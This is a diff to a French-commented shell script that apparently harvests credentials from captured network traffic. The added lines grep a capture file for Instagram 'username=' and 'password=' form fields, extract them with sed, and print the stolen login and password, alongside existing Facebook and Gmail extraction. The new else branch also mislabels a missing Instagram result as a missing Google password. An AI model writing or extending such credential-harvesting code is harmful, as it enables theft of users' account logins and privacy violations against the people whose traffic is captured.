@@ -356,6 +356,18 @@ while [ $sortie -eq "0" ]
 						else
 							checkfb=0
 					fi
+					
+					insta_login=$(grep -a "username=" $chemin | grep -a "&pass" | sed 's/.*username=\([^&]*\).*/\1/')
+                                        insta_pass=$(grep -a "username=" $chemin | grep -a "&pass" | sed 's/.*password=\([^&]*\).*/\1/')
+					
+
+                                        if [ -z $insta_login ] || [ -z $insta_pass ] # On vérifie que que le login et le mot de passe ne sont pas vide
+                                                then
+                                                        checkinsta=1
+                                                else
+                                                        checkinsta=0
+                                        fi
+
 
 					gmail_login=$(grep -a "Email=" $chemin | grep -a "&Passwd=" | sed 's/.*Email=\([^&]*\).*/\1/')
 					gmail_pass=$(grep -a "Email=" $chemin | grep -a "&Passwd=" | sed 's/.*Passwd=\([^&]*\).*/\1/')
@@ -390,6 +402,19 @@ while [ $sortie -eq "0" ]
 							echo "--------------------------------------------------------------------------------"	
 							echo " "
 						fi
+						
+                                        if [ $checkinsta -eq 0 ]
+                                                then
+                                                        echo "Des informations de connexions Instagram ont été trouvées"
+                                                        echo " \033[0;32mLogin:\033[0m $insta_login  \033[0;32mPassword:\033[0m $insta_pass"
+                                                        echo "--------------------------------------------------------------------------------"
+                                                        echo " "
+                                                else
+                                                        echo "\033[0;31m Pas de mots de passe GOOGLE trouvé\033[0m"
+                                                        echo "--------------------------------------------------------------------------------"
+                                                        echo " "
+                                        fi
+
 
 					if [ $checkgm -eq 0 ]
 						then
